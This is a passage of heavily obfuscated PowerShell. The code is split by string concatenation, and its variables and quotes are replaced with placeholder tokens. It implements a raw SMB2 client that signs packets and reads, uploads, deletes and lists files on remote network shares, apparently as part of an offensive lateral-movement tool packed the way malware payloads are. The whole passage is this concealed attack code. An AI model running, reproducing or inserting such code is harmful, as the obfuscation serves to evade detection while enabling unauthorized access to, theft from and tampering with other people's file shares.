                                    wB69root_directory_string = New-Object System.String (wB69root_directory_extract,0,wB69root_directory_extract.Length)

                                }

                     '+'           else

                                {

                                    wB69root_directory_string = [Char][System.Convert]::ToInt16(wB69file,16)

                                }


                            }


                        }

                        elseif(wB69Action -eq utH9GetutH9 -and wB69action_step -eq 1)

                        {


                            if(wB69share_subdirectory -eq wB69source_file)

                            {

                                wB69file = NDckNDck

                            }

                            else

                            {

                                wB69file = [System.Text.Encoding]::Unicode.GetBytes(wB69share_subdirectory.Replace(utH99e0utH9 + wB69source_file,utH9utH9))

                            }


                            wB69create_request_extra_info = 1

                            wB69stage = utH9CreateRequestutH9

                        }

                        elseif(wB69Action -eq utH9DeleteutH9)

                        {

                            

                            switch(wB69action_step)

                            {


                                0

                                {


                                    if(wB69share_subdirectory -eq wB69source_file)

                                    {

                                        wB69file = NDckNDck

                                    }

                                    else

                                    {

                                        wB69file = [System.Text.Encoding]::Unicode.GetBytes(wB69share_subdirectory.Replace(utH99e0utH9 + wB69source_file,utH9utH9))

                                    }


                                    wB69create_request_extra_info = 1

                                    wB69stage = utH9CreateReques'+'tutH9

                                    wB69action_step++


                                }


                                1

                                {

                                    wB69stage = utH9CreateRequestFindRequestutH9

                                }


                                3

                                {

                                    wB69stage = utH9TreeDisconnectutH9

                                }


                            }


                        }

                        elseif(wB69share_subdirectory_start)

                        {

                            wB69share_subdirectory_start = wB69false

                            wB69stage = utH9CreateRequestFindRequestutH9

                        }

                        else

                        {

                            wB69stage = utH9TreeDisconnectutH9

                        }


                    }


                    utH9CreateRequestutH9

                    {

                        wB69message_ID++

                        wB69packet_SMB2_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 wB69SMB_signing wB69message_ID wB69process_ID wB69tree_ID wB69session_ID

                        wB69packet_SMB2_data = New-PacketSMB2CreateRequest wB69file wB69create_request_extra_info wB69source_file_size


                        if(wB69directory_list.Count -gt 0)

                        {

                            wB69packet_SMB2_data[NDckDesiredAccessNDck] = 0x81,0x00,0x10,0x00

                            wB69packet_SMB2_data[NDckShareAccessNDck] = 0x07,0x00,0x00,0x00

                        }

                        

                        if(wB69Action -eq utH9DeleteutH9)

                        {


                            switch(wB69action_step)

                            {

                                

                                0

                                {

                                    wB69packet_SMB2_data[NDckCreateOptionsNDck] = 0x00,0x00,0x20,0x00

                                    wB69packet_SMB2_data[NDckDesiredAccessNDck] = 0x80,0x00,0x00,0x00

                                    wB69packet_SMB2_data[NDckShareAccessNDck] = 0x07,0x00,0x00,0x00

                                }


                                2

                                {

                                    wB69packet_SMB2_data[NDckCreateOptionsNDck] = 0x40,0x00,0x20,0x00

                                    wB69packet_SMB2_data[NDckDesiredAccessNDck] = 0x80,0x00,0x01,0x00

                                    wB69packet_SMB2_data[NDckShareAccessNDck] = 0x07,0x00,0x00,0x00

                                }


                            }


                        }


                        if(wB69Action -eq utH9GetutH9)

                        {

                            wB69packet_SMB2_data[NDckCreateOptionsNDck] = 0x00,0x00,0x20,0x00

                            wB69packet_SMB2_data[NDckDesiredAccessNDck] = 0x89,0x00,0x12,0x00

                            wB69packet_SMB2_data[NDckShareAccessNDck] = 0x05,0x00,0x00,0x00

                        }


                        if(wB69Action -eq utH9PututH9)

                        {

                        

                            switch(wB69action_step)

                            {


                                0

                                {

                                    wB69packet_SMB2_data[NDckCreateOptionsNDck] = 0x60,0x00,0x20,0x00

                                    wB69packet_SMB'+'2_data[NDckDesiredAccessNDck] = 0x89,0x00,0x12,0x00

                                    wB69packet_SMB2_data[NDckShareAccessNDck] = 0x01,0x00,0x00,0x00

                                    wB69packet_SMB2_data[NDckRequestedOplockLevelNDck] = 0xff

                                }


                                1

                                {

                                    wB69packet_SMB2_data[NDckCreate'+'OptionsNDck] = 0x64,0x00,0x00,0x00

                                    wB69packet_SMB2_data[NDckDesiredAccessNDck] = 0x97,0x01,0x13,0x00

                                    wB69packet_SMB2_data[NDckShareAccessNDck] = 0x00'+',0x00,0x00,0x00

                                    wB69packet_SMB2_data[NDckRequestedOplockLevelNDck] = 0xff

                                    wB69packet_SMB2_data[NDckFileAttributesNDck] = 0x20,0x00,0x00,0x00

                                    wB69packet_SMB2_data[NDckCreateDispositionNDck] = 0x05,0x00,0x00,0x00

                                }


                            }


                        }


                        wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                        wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data  

                        wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB2_header.Length wB69SMB2_data.Length

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                        if(wB69SMB_signing)

                        {

                            wB69SMB2_sign = wB69SMB2_header + wB69SMB2_data  

                            wB69SMB2_signature = wB69HMAC_SHA256.ComputeHash(wB69SMB2_sign)

                            wB69SMB2_signature = wB69SMB2_signature[0..15]

                            wB69packet_SMB2_header[NDckSignatureNDck] = wB69SMB2_signature

                            wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                        }


                        wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data

                        wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                        wB69client_stream.Flush()

                        wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null

                        

                        if([System.BitConverter]::ToString(wB69client_receive[12..15]) -ne utH900-00-00-00utH9)

                        {


                            wB69error_code = [System.BitConverter]::ToString(wB69client_receive[15..12])


                            switch(wB69error_code)

                            {


                                utH9c0-00-01-03utH9

                                {

                                    wB69stage = utH9ExitutH9

                                }


                                utH9c0-00-00-22utH9

                                {


                                    if(wB69directory_list.Count -gt 0)

                                    {

                                        wB69directory_list.RemoveAt(0) > wB69null

                                    }

                                    else

                                    {

                                        wB69output_message = NDck[-] Access deniedNDck

                                        wB69share_subdirectory_start = wB69false

                                    }


                                    wB69stage = utH9CloseRequestutH9


                                }


                                utH9c0-00-00-34utH9

                                {


                                    if(wB69Action -eq utH9PututH9)

                                    {

                                        wB69create_request_extra_info = 3

                         '+'               wB69action_step++

                                        wB69stage = utH9CreateRequestutH9

                                    }

                                    else

                                    {

                                        wB69output_message = NDck[-] File not foundNDck

                                        wB69stage = utH9ExitutH9

                                    }


                                }


                                utH9c0-00-00-bautH9

                                {

                                    

                                    if(wB69Action -eq utH9PututH9)

                                    {

                                        wB69output_message = NDck[-] Destination filname must be specifiedNDck

                                        wB69stage = utH9CloseRequestutH9

                                    }


                                }


                                default

                                {

                                    wB69error_code = wB69error_code -replace NDck-NDck,NDckNDck

                                    wB69output_message = NDck[-] Create request error code 0xwB69error_codeNDck

                                    wB69stage = utH9ExitutH9

                                }


                            }


                        }

                        elseif(wB69Action -eq utH9DeleteutH9 -and wB69action_step -eq 2)

                        {

                            wB69set_info_request_file_info_class = 0x01

                            wB69set_info_request_info_level = 0x0d

                            wB69set_info_request_buffer = 0x01,0x00,0x00,0x00

                            wB69file_ID = wB69client_receive[132..147]

                            wB69stage = utH9SetInfoRequestutH9

                        }

                        elseif(wB69Action -eq utH9GetutH9 -and wB69action_step -ne 1)

                        {


                            switch(wB69action_step)

                            {


                                0

                                {

                                    wB69file_ID = wB69client_receive[132..147]

                                    wB69action_step++

                                    wB69stage = utH9CloseRequestutH9

                                }


                                2

                              '+'  {


                                    if(wB69file_size -lt 4096)

                                    {

                                        wB69read_request_length = wB69file_size

                                    }

                                    else

                                    {

                                        wB69read_request_length = 4096

                                    }


                                    wB69read_request_offset = 0

                                    wB69file_ID = wB69client_receive[132..147]

                                    wB69action_step++

                                    wB69stage = utH9ReadRequestutH9

                                }


                                4

                                {

                                    wB69header_next_command = 0x68,0x00,0x00,0x00

                                    wB69query_info_request_info_type_1 = 0x01

                                    wB69query_info_request_file_info_class_1 = 0x07

                                    wB69query_info_request_output_buffer_length_1 = 0x00,0x10,0x00,0x00

                                    wB69query_info_request_input_buffer_offset_1 = 0x68,0x00

                                    wB69query_info_request_buffer_1 = 0

                                    wB69query_info_request_info_type_2 = 0x01

                                    wB69query_info_request_file_info_class_2 = 0x16

                                    wB69query_info_request_output_buffer_length_2 = 0x00,0x10,0x00,0x00

                                    wB69query_info_request_input_buffer_offset_2 = 0x68,0x00

                                    wB69query_info_request_buffer_2 = 0

                                    wB69file_ID = wB69client_receive[132..147]

                                    wB69action_step++

                                  '+'  wB69stage = utH9QueryInfoRequestutH9

                                }


                            }


                        }

                        elseif(wB69Action -eq utH9PututH9)

                        {


                            switch(wB69action_step)

                            {

'+'

                                0

                                {


                                    if(wB69Action -eq utH9PututH9)

            '+'                        {

                                        wB69script:sign = utH91utH9

                                        wB69output_message = NDckDestination file existsNDck

                                        wB69stage = utH9CloseRequestutH9

                                    }


                                }


                                1

                                {

                                    wB69file_ID = wB69client_receive[132..147]

                                    wB69action_step++

                                    wB69header_next_command = 0x70,0x00,0x00,0x00

                                    wB69query_info_request_info_type_1 = 0x02

                                    wB69query_info_request_file_info_class_1 = 0x01

                                    wB69query_info_request_output_buffer_length_1 = 0x58,0x00,0x00,0x00

                                    wB69query_info_request_input_buffer_offset_1 = 0x00,0x00

                                    wB69query_info_request_buffer_1 = 8

                                    wB69query_info_request_info_type_2 = 0x02

                                    wB69query_info_request_file_info_class_2 = 0x05

                                    '+'wB69query_info_request_output_buffer_length_2 = 0x50,0x00,0x00,0x00

                                    wB69query_info_request_input_buffer_offset_2 = 0x00,0x00

                                    wB69query_info_request_buffer_2 = 1

                                    wB69stage = utH9QueryInfoRequestutH9

                                }


                            }


                        }

                        elseif(wB69share_subdirect'+'ory_start)

                        {

                            wB69file_ID = wB69client_receive[132..147]

                            wB69stage = utH9CloseRequestutH9

                        }

                        elseif(wB69directory_list.Count -gt 0 -or wB69action_step -eq 1)

                        {

                            wB69stage = utH9FindRequestutH9

                        }

                        else

                        {

                            wB69header_next_command = 0x70,0x00,0x00,0x00

                            wB69query_info_request_info_type_1 = 0x02

                            wB69query_info_request_file_info_class_1 = 0x01

                            wB69query_info_request_output_buffer_length_1 = 0x58,0x00,0x00,0x00

                            wB69query_info_request_input_buffer_offset_1 = 0x00,0x00

                            wB69query_info_request_buffer_1 = 8

                            wB69query_info_request_info_type_2 = 0x02

                            wB69query_info_request_file_info_class_2 = 0x05

                            wB69query_info_request_output_buffer_length_2 = 0x50,0x00,0x00,0x00

                            wB69query_info_request_input_buffer_offset_2 = 0x00,0x00

                            wB69query_info_request_buffer_2 = 1

                            wB69file_ID = wB69client_receive[132..147]

                            wB69stage = utH9QueryInfoRequestutH9


                            if(wB69share_subdirectory)

                            {

                                wB69share_subdirectory_start = wB69true

                            }


                        }


                    }


                    utH9CreateRequestFindRequestutH9

                    {

                        wB69message_ID++

                        wB69packet_SMB2_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 wB69SMB_signing wB69message_ID wB69process_ID wB69tree_ID wB69session_ID

                        wB69packet_SMB2_data = New-PacketSMB2CreateRequest wB69file 1

                        wB69packet_SMB2_data[NDckDesiredAccessNDck] = 0x81,0x00,0x10,0x00

                        wB69packet_SMB2_data[NDckShareAccessNDck] = 0x07,0x00,0x00,0x00

                        wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                        wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data

                        wB69packet_SMB2_header[NDckNextCommandNDck] = [System.BitConverter]::GetBytes(wB69SMB2_header.Length + wB69SMB2_data.Length)

                        wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                        wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data


                        if(wB69SMB_signing)

                        {

                            wB69SMB2_sign = wB69SMB2_header + wB69SMB2_data  

                            wB69SMB2_signature = wB69HMAC_SHA256.ComputeHash(wB69SMB2_sign)

                            wB69SMB2_signature = wB69SMB2_signature[0..15]

                            wB69packet_SMB2_header[NDckSignatureNDck] = wB69SMB2_signature

                            wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                        }


                        wB69message_'+'ID++

                        wB69packet_SMB2b_header = New-PacketSMB2Header 0x0e,0x00 0x01,0x00 wB69SMB_sign'+'ing wB69message_ID wB69process_ID wB69tree_ID wB69session_ID

                        wB69packet_SMB2b_header[NDckNextCommandNDck] = 0x68,0x00,0x00,0x00


                        if(wB69SMB_signing)

                        {

                            wB69packet_SMB2b_header[NDckFlagsNDck] = 0x0c,0x00,0x00,0x00      

                        }

                        else

                        {

                            wB69packet_SMB2b_header[NDckFlagsNDck] = 0x04,0x00,0x00,0x00

                        }


                        wB69packet_SMB2b_data = New-PacketSMB2FindRequestFile 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff 0x00,0x00,0x00,0x00,0x00,0x00

                        wB69SMB2b_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2b_header

                        wB69SMB2b_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2b_data    


                        if(wB69SMB_signing)

                        {

                            wB69SMB2_sign = wB69SMB2b_header + wB69SMB2b_data 

                            wB69SMB2_signature = wB69HMAC_SHA256.Co'+'mputeHash(wB69SMB2_sign)

                            wB69SMB2_signature = wB69SMB2_signature[0..15]

                            wB69packet_SMB2b_header[NDckSignatureNDck] = wB69SMB2_signature

                            wB69SMB2b_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2b_header

                    '+'    }


                        wB69message_ID++

                        wB69packet_SMB2c_header = New-PacketSMB2Header 0x0e,0x00 0x01,0x00 wB69SMB_signing wB69message_ID wB69process_ID wB69tree_ID wB69session_ID


                        if(wB69SMB_signing)

                        {

                            wB69packet_SMB2c_header[NDckFlagsNDck] = 0x0c,0x00,0x00,0x00      

                        }

                        else

                        {

                            wB69packet_SMB2c_header[NDckFlagsNDck] = 0x04,0x00,0x00,0x00

                        }


                        wB69packet_SMB2c_data = New-PacketSMB2FindRequestFile 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff

                        wB69packet_SMB2c_data[NDckOutputBufferLengthNDck] = 0x80,0x00,0x00,0x00

                        wB69SMB2c_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2c_header

                        wB69SMB2c_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2c_data    

                        wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService (wB69SMB2_header.Length + wB69SMB2b_header.Length + wB69SMB2c_header.Length)  (wB69SMB2_data.Length + wB69SMB2b_data.Length + wB69SMB2c_data.Length)

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                        if(wB69SMB_signing)

                        {

                            wB69SMB2_sign = wB69SMB2c_header + wB69SMB2c_data 

                            wB69SMB2_signature = wB69HMAC_SHA256.ComputeHash(wB69SMB2_sign)

                            wB69SMB2_signature = wB69SMB2_signature[0..15]

                            wB69packet_SMB2c_header[NDckSignatureNDck] = wB69SMB2_signature

                            wB69SMB2c_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2c_header

                        }


                        wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data + wB69SMB2b_header + wB69SMB2b_data + wB69SMB2c_header + wB69SMB2c_data

                        wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                        wB69client_stream.Flush()

                        wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null


                        if(wB69Action -eq utH9DeleteutH9)

                        {

                            wB69stage = utH9CreateRequestutH9

                            wB69file = [System.Text.Encoding]::Unicode.GetBytes(wB69share_subdirectory)

                            wB69action_step++

                        }

                        else

                        {

                            wB69stage = utH9ParseDirectoryContentsutH9

                        }


                    }


                    utH9FindRequestutH9

                    {

                        wB69file_ID = wB69client_receive[132..147]

                        wB69message_ID++

                        wB69packet_SMB2_header = New-PacketSMB2Header 0x0e,0x00 0x01,0x00 wB69SMB_signing wB69message_ID wB69process_ID wB69tree_ID wB69session_'+'ID

                        wB69packet_SMB2_header[NDckNextCommandNDck] = 0x68,0x00,0x00,0x00

                        wB69packet_SMB2_data = New-PacketSMB2FindRequestFile wB69file_ID 0x00,0x00,0x00,0x00,0x00,0x00

                        wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                        wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data    


                        if(wB69SMB_signing)

                        {

                            wB69SMB2_sign = wB69SMB2_header + wB69SMB2_data 

                            wB69SMB2_signature = wB69HMAC_SHA256.ComputeHash(wB69SMB2_sign)

                            wB69SMB2_signature = wB69SMB2_signature[0..15]

                            wB69packet_SMB2_header[NDckSignatureNDck] = wB69SMB2_signature

                            wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                        }


                        wB69message_ID++

                        wB69packet_SMB2b_header = New-PacketSMB2Header 0x0e,0x00 0x01,0x00 wB69SMB_signing wB69message_ID wB69process_ID wB69tree_ID wB69session_ID


                        if(wB69SMB_signing)

                        {

                            wB69packet_SMB2b_header[NDckFlagsNDck] = 0x0c,0x00,0x00,0x00      

                        }

                        else

                        {

                            wB69packet_SMB2b_header[NDckFlagsNDck] = 0x04,0x00,0x00,0x00

                        }


                        wB69packet_SMB2b_data = New-PacketSMB2FindRequestFile wB69file_ID

                        wB69packet_SMB2b_data[NDckOutputBufferLengthNDck] = 0x80,0x00,0x00,0x00

                        wB69SMB2b_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2b_header

                        wB69SMB2b_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2b_data    

                        wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService (wB69SMB2_header.Length + wB69SMB2b_header.Length)  (wB69SMB2_data.Length + wB69SMB2b_data.Length)

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                        if(wB69SMB_signing)

                        {

                            wB69SMB2_sign = wB69SMB2b_header + wB69SMB2b_data 

                            wB69SMB2_signature = wB69HMAC_SHA256.ComputeHash(wB69SMB2_sign)

                            wB69SMB2_signature = wB69SMB2_signature[0..15]

                            wB69packet_SMB2b_header[NDckSignatureNDck] = wB69SMB2_signature

                            wB69SMB2b_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2b_header

                        }


                        wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data + wB69SMB2b_header + wB69SMB2b_data

                        wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                        wB69client_stream.Flush()

                        wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null


                        if(wB69Action -eq utH9GetutH9 -and wB69action_step -eq 1)

                        {

                            wB69find_response = [System.BitConverter]::ToString(wB69client_receive)

                            wB69find_response = wB69find_response -replace NDck-NDck,NDckNDck

                            wB69file_unicode = [System.BitConverter]::ToString([System.Text.Encoding]::Unicode.GetBytes(wB69source_file))

                            wB69file_unicode = wB69file_unicode -replace NDck-NDck,NDckNDck

                            wB69file_size_index = wB69find_response.IndexOf(wB69file_unicode) - 128

                            wB69file_size = [System.BitConverter]::ToUInt32(wB69client_receive[(wB69file_size_index / 2)..(wB69file_size_index / 2 + 7)],0)

                            wB69action_step++

                            wB69create_request_extra_info = 1

                            wB69stage = utH9CreateRequestutH9


                            if(wB69share_subdirectory -eq wB69file)

                            {

                                wB69file = [System.Text.Encoding]::Unicode.GetBytes(wB69file)

                            }

                            else

                            {

                                wB69file = [System.Text.Encoding]::Unicode.GetBytes(wB69share_subdirectory)

                            }


                        }

                        else

                        {

                            wB69stage = utH9ParseDirectoryContentsutH9

                        }


                    }


                    utH9IoctlRequestutH9

                    {

                        wB69tree_ID = wB69client_receive[40..43]

                        wB69ioctl_path = NDck9e0NDck + wB69Target + NDck9e0NDck + wB69Share

                        wB69ioctl_path_bytes = [System.Text.Encoding]::Unicode.GetBytes(wB69ioctl_path) + 0x00,0x00

                        wB69message_ID++

                        wB69packet_SMB2_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 wB69SMB_signing wB69message_ID wB69process_ID wB69tree_ID wB69session_ID

                        wB69packet_SMB2_data = New-PacketSMB2IoctlRequest wB69ioctl_path_bytes

                        wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                        wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data    

                        wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB2_header.Length wB69SMB2_data.Length

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                        if(wB69SMB_signing)

                        {

                            wB69SMB2_sign = wB69SMB2_header + wB69SMB2_data 

                            wB69SMB2_signature = wB69HMAC_SHA256.ComputeHash(wB69SMB2_sign)

                            wB69SMB2_signature = wB69SMB2_signature[0..15]

                            wB69packet_SMB2_header[NDckSignatureNDck] = wB69SMB2_signature

                            wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                        }


                        wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data

                        wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                        wB69client_stream.Flush()

                        wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null

                        wB69tree_ID = 0x00,0x00,0x00,0x00

                        wB69stage = utH9TreeConnectutH9

                    }


                    utH9LogoffutH9

                    {

                        wB69message_ID++

                        wB69packet_SMB2_header = New-PacketSMB2Header 0x02,0x00 0x01,0x00 wB69SMB_signing wB69message_ID wB69process_ID wB69tree_ID wB69session_ID

                        wB69packet_SMB2_data = New-PacketSMB2SessionLogoffRequest

                        wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_he'+'ader

                        wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data

                        wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB2_header.Length wB69SMB2_data.Length

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_'+'NetBIOS_session_service


                        if(wB69SMB_signing)

                        {

                            wB69SMB2_sign = wB69SMB2_header + wB69SMB2_data

                            wB69SMB2_signature = wB69HMAC_SHA256.ComputeHash(wB69SMB2_sign)

                            wB69SMB2_signature = wB69SMB2_signature[0..15]

                            wB69packet_SMB2_header[NDckSignatureNDck] = wB69SMB2_signature

                            wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                        }


                        wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data

                        wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                        wB69client_stream.Flush()

                        wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null

                        wB69stage = utH9ExitutH9

                    }


                    utH9ParseDirectoryContentsutH9

                    {

                        wB69subdirectory_list = New-Object System.Collections.ArrayList

                        wB69create_response_file = [System.BitConverter]::ToString(wB69client_receive)

                        wB69create_response_file = wB69create_response_file -replace NDck-NDck,NDckNDck

                        wB69directory_contents_mode_list = New-Object System.Collections.ArrayList

                        wB69directory_contents_create_time_list = New-Object System.Collections.ArrayList

                        wB69directory_contents_last_write_time_list = New-Object System.Collections.ArrayList

                        wB69directory_contents_length_list = New-Object System.Collections.ArrayList

                        wB69directory_contents_name_list = New-Object System.Collections.ArrayList


                        if(wB69directory_list.Count -gt 0)

                        {

                            wB69create_response_file_index = 152

                            wB69directory_list.RemoveAt(0) > wB69null

                        }

                        else

                        {

                            wB69create_response_file_index = wB69create_response_file.Substring(10).IndexOf(NDckFE534D42NDck) + 154

                        }


                        do

                        {

                            wB69SMB_next_offset = [System.BitConverter]::ToUInt32(wB69client_receive[(wB69create_response_file_index / 2 + wB69SMB_offset)..(wB69create_response_file_index / 2 + 3 + wB69SMB_offset)],0)

                            wB69SMB_file_length = [System.BitConverter]::ToUInt32(wB69client_receive[(wB69create_response_file_index / 2 + 40 + wB69SMB_offset)..(wB69create_response_file_index / 2 + 47 + wB69SMB_offset)],0)

                            wB69SMB_file_attributes = [Convert]::ToString(wB69client_receive[(wB69create_response_file_index / 2 + 56 + wB69SMB_offset)],2).PadLeft(16,utH90utH9)


                            if(wB69SMB_file_length -eq 0)

                            {

                                wB69S'+'MB_file_length = wB69null

                            }


                            if(wB69SMB_file_attributes.Substring(11,1) -eq utH91utH9'+')

                            {

                                wB69SMB_file_mode = NDckdNDck

                            }

                            else

                            {

                                wB69SMB_file_mode = NDck-NDck

                            }


                            if(wB69SMB_file_attributes.Substring(10,1) -eq utH91utH9)

                            {

                                wB69SMB_file_mode+= NDckaNDck

                            }

                            else

                            {

                                wB69SMB_file_mode+= NDck-NDck

                            }


                            if(wB69SMB_file_attributes.Substring(15,1) -eq utH91utH9)

                            {

                                wB69SMB_file_mode+= NDckrNDck

                            }

                            else

                            {

                                wB69SMB_file_mode+= NDck-NDck

                            }


                            if(wB69SMB_file_attributes.Substring(14,1) -eq utH91utH9)

                            {

                                wB69SMB_file_mode+= NDckhNDck

                            }

                            else

                            {

                                wB69SMB_file_mode+= NDck-NDck

                            }


                            if(wB69SMB_file_attributes.Substring(13,1) -eq utH91utH9)

                            {

                                wB69SMB_file_mode+= NDcksNDck

                            }

                            else

                            {

                                wB69SMB_file_mode+= NDck-NDck

                            }


                            wB69file_create_time = [Datetime]::FromFileTime([System.BitConverter]::ToInt64(wB69client_receive[(wB69create_response_file_index / 2 + 8 + wB69SMB_offset)..(wB69create_response_file_index / 2 + 15 + wB69SMB_offset)],0))

                            wB69file_create_time = Get-Date wB69file_create_time -format utH9M/d/yyyy h:mm ttutH9

                            wB69file_last_write_time = [Datetime]::FromFileTime([System.BitConverter]::ToInt64(wB69client_receive[(wB69create_response_file_index / 2 + 24 + wB69SMB_offset)..(wB69create_response_file_index / 2 + 31 + wB69SMB_offset)],0))

                            wB69file_last_write_time = Get-Date wB69file_last_write_time -format utH9M/d/yyyy h:mm ttutH9

                            wB69SMB_filename_length = [System.BitConverter]::ToUInt32(wB69client_receive[(wB69create_response_file_index / 2 + 60 + wB69SMB_offset)..(wB69create_response_file_index / 2 + 63 + wB69SMB_offset)],0)

        '+'                    wB69SMB_filename_unicode = wB69client_receive[(wB69create_response_file_index / 2 + 104 + wB69SMB_offset)..(wB69create_response_file_index / 2 + 104 + wB69SMB_offset + wB69SMB_filename_length - 1)]

                            wB69SMB_filename = [System.BitConverter]::ToString(wB69SMB_filename_unicode)

                            wB69SMB_filename = wB69SMB_filename -replace NDck-00NDck,NDckNDck


                            if(wB69SMB_filename.Length -gt 2)

                            {

                                wB69SMB_filename = wB69SMB_filename.Split(NDck-NDck) uOva ForEach-Object{[Char][System.Convert]::ToInt16(wB69_,16)}

                                wB69SMB_filename_extract = New-Object Sys'+'tem.String (wB69SMB_filename,0,wB69SMB_filename.Length)

                            }

                            else

                            {

                                wB69'+'SMB_filename_extract = [String][Char][System.Convert]::ToInt16(wB69SMB_filename,16)

                            }


                            if(!wB69Modify)

                            {

              '+'                  wB69file_last_write_time = wB69file_last_write_time.PadLeft(19,0)

                                [String]wB69SMB_file_length = wB69SMB_file_length

                                wB69SMB_file_length = wB69SMB_file_length.PadLeft(15,0)

                            }


                            if(wB69SMB_file_attributes.Substring(11,1) -eq utH'+'91utH9)

       '+'                     {


                                if(wB69SMB_filename_extract -ne utH9.utH9 -and wB69SMB_filename_extract -ne utH9..utH9)

                                {

                                    '+'wB69subdirectory_list.Add(wB69SMB_filename_unicode) > wB69null

                                    wB69directory_contents_name_list.Add(wB69SMB_filename_extract) > wB69null

                                    wB69directory_contents_mode_list.Add(wB69SMB_file_mode) > wB69null

                                    wB69directory_contents_length_list.Add(wB69SMB_file_length) > wB69null

                                    wB69directory_contents_last_write_time_list.Add(wB69file_last_write_time) > wB69null

                                    wB69directory_contents_create_time_list.Add(wB69file_create_time) > wB69null

            '+'                    }


                            }

                            else

                            {

                                wB69directory_contents_name_list.Add(wB69SMB_filename_extract) > wB69null

                                wB69directory_contents_mode_list.Add(wB69SMB_fil'+'e_mode) > wB69null

                                wB69directory_contents_length_list.Add(wB69SMB_file_length) > wB69null

                                wB69directory_contents_last_write_time_list.Add(wB69file_last_write_time) > wB69null

                                wB69directory_contents_create_time_list.Add(wB69file_create_time) > wB69null

                            }


                            if(wB69share_subdirectory -and !wB69share_subdirectory_start)

                            {

                                wB69root_directory_string = wB69share_subdirectory + utH99e0utH9

                            }


                            wB69SMB_offset += wB69SMB_next_offset

                        }

                        until(wB69SMB_next_offset -eq 0)


                        if(wB69directory_contents_name_list)

                        {


                            if(wB69root_directory_string)

                            {

                                wB69file_directory = wB69target_share + NDck9e0NDck + wB69root_directory_string.Substring(0,wB69root_directory_string.Length - 1)

                            }

                            else

                 '+'           {

                                wB69file_directory = wB69target_share

                            }


                        }


                        wB69directory_contents_output = @()

                        wB69i = 0


                        ForEach(wB69directory in wB69directory_contents_name_list)

                        {

                            wB69directory_object = New-Object PSObject

                            Add-Member -InputObject wB69directory_object -MemberType NoteProperty -Name Name -Value (wB69file_directory + NDck9e0NDck + wB69directory_contents_name_list[wB69i])

                            Add-Member -InputObject wB69directory_object -MemberType NoteProperty -Name Mode -Value wB69directory_contents_mode_list[wB69i]

                            Add-Member -InputObject wB69directory_object -MemberType NoteProperty -Name Length -Value wB69directory_contents_length_list[wB69i]


                            if(wB69Modify)

                            {

                                Add-Member -InputObject wB69directory_object -MemberType NoteProperty -Name CreateTime -Value wB69directory_contents_create_time_list[wB69i]

                            }


